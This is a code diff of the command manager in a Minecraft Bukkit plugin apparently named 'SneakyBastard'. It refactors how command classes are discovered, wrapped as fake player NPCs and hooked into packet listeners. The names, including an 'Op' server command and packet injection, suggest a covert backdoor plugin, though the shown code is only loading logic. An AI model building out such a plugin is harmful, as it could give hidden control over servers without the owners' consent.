@@ -3,7 +3,6 @@ package net.blackofworld.SneakyBastard.Command;
 import com.google.common.reflect.ClassPath;
 import com.mojang.authlib.GameProfile;
 import lombok.experimental.ExtensionMethod;
-import net.blackofworld.SneakyBastard.Commands.Server.Op;
 import net.blackofworld.SneakyBastard.Extensions.PlayerExt;
 import net.blackofworld.SneakyBastard.Start;
 import net.blackofworld.SneakyBastard.Utils.BukkitReflection;
@@ -76,24 +75,25 @@ public class CommandManager {
     private void Init() {
         try {
             final ClassPath classPath = ClassPath.from(CommandManager.class.getClassLoader());
-            String packageName = Op.class.getName().substring(0, Op.class.getName().lastIndexOf('.'));
-            packageName = packageName.substring(0, packageName.lastIndexOf('.'));
-            for (final ClassPath.ClassInfo info : classPath.getTopLevelClassesRecursive(packageName)) {
-                CommandBase cmd = (CommandBase) info.load().getDeclaredConstructor().newInstance();
-                UUID uuid = UUID.randomUUID();
-                var world = Bukkit.getWorlds().get(0);
-                var nmsWorld = BukkitReflection.getWorldLevel(world);
-                var server = BukkitReflection.getMinecraftServer();
-                ServerPlayer npc = new ServerPlayer(server, nmsWorld, new GameProfile(uuid, COMMAND_SIGN + cmd.Command));
-                fakePlayers.put(uuid, npc);
-                commandList.add(cmd);
-                if(cmd instanceof PacketListener listener) {
-                    PacketInject.registerListener(listener);
+            for (final ClassPath.ClassInfo info : classPath.getTopLevelClassesRecursive(Start.class.getPackageName())) {
+                Class<?> clazz = info.load();
+                if(CommandBase.class.equals(clazz.getSuperclass())) {
+                    CommandBase cmd = (CommandBase) info.load().getDeclaredConstructor().newInstance();
+                    UUID uuid = UUID.randomUUID();
+                    var world = Bukkit.getWorlds().get(0);
+                    var nmsWorld = BukkitReflection.getWorldLevel(world);
+                    var server = BukkitReflection.getMinecraftServer();
+                    ServerPlayer npc = new ServerPlayer(server, nmsWorld, new GameProfile(uuid, COMMAND_SIGN + cmd.Command));
+                    fakePlayers.put(uuid, npc);
+                    commandList.add(cmd);
+                    if (cmd instanceof PacketListener listener) {
+                        PacketInject.registerListener(listener);
+                    }
                 }
             }
         } catch (IOException | NoSuchMethodException | InstantiationException | IllegalAccessException |
                  InvocationTargetException e) {
-            throw new RuntimeException(e);
+            throw new RuntimeException(e.toString(), e);
         }
     }
 }
